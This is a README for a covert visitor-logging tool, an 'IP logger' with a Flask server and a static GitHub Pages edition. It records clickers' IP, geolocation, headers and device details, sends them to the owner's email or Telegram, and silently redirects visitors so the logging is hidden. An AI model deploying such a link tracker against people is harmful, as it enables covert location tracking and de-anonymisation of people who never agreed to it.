# 🛰️ Baran IP Log — Connection Analytics Server (MIT)

Mini Flask web server that logs HTTP connection metadata (IP, User-Agent,
language, referrer, all headers), enriches it with GeoIP, saves to a JSONL
log, shows a live dashboard, then 302-redirects the visitor.

Designed & built by **Baran Avisat** (professional programmer).
📧 baranavisat@gmail.com · 📞 +90 531 326 37 22 · WhatsApp
BTC `bc1q8dhtdrndxsl70e97t8grydfe6pjue37zrhzf6c` ·
USDT-TRC20 `TLWdTjqqogkXNEXGiPWsGdjFP6ioycxeWW`

## LEGAL — authorized use only

Penetration tests within engagement scope, your own incident forensics,
and your own link analytics. Logging third parties without authorization
may be illegal (GDPR & equivalents). No credential harvesting, no fake
login pages — only standard HTTP metadata every web server logs.

## Run locally

```bash
cd baraniplog
pip install -r requirements.txt
python3 app.py            # or: IPLOG_PORT=8090 IPLOG_REDIRECT=https://youtube.com python3 app.py
```

## Go live (Flask needs a Python host — GitHub Pages can't run it)

- **Render (free):** dashboard.render.com → New Web Service → connect repo
  `baraniplog` (auto-detects `render.yaml`) → Deploy. Set
  `IPLOG_ADMIN_KEY` in Environment to keep your dashboard key stable.
- **Railway:** railway.app → New Project → Deploy from repo (uses `Procfile`).
- Note: free tiers sleep when idle — a logger that must always listen
  deserves a $5 VPS (Hetzner/DigitalOcean: `nohup python3 app.py &`).

Env knobs: `IPLOG_PORT` (8090), `IPLOG_REDIRECT` (google.com),
`IPLOG_FILE` (logs.jsonl), `IPLOG_ADMIN_KEY` (auto-generated otherwise —
printed at startup, required for `/dashboard?key=...`).

## Endpoints

- `GET /` or any path → log + 302 redirect
- `GET /health` → JSON status
- `GET /dashboard?key=KEY` → last 200 connections + owner credit

## Log format (JSONL, one object per line)

`time, ip, ua, parsed{os,browser,device}, lang, referer, method, path,
geo{country,city,isp,lat,lon}, headers{...}`

## License

MIT.

<!-- live -->

## Static always-on edition (recommended, free forever)

`index.html` runs the whole logger **in the visitor's browser** — no
server, no sleep, no keys. Live at:
https://aoodiakdiro0001-ops.github.io/baraniplog/

- Collects IP (ipify) → geo (ipapi.co → ipwho.is fallback), UA parse,
  language, timezone, screen, referrer.
- Delivers to your inbox via FormSubmit (+Telegram if you fill `CONFIG.tg`
  privately — never commit secrets).
- Silent redirect after ~2.5s. Test with `?debug=1` (shows data, no redirect).

**One-time setup:** open the live link once yourself → FormSubmit sends an
activation email to baranavisat@gmail.com → click it. Afterwards every
visit lands in your inbox. First real visit = first email.
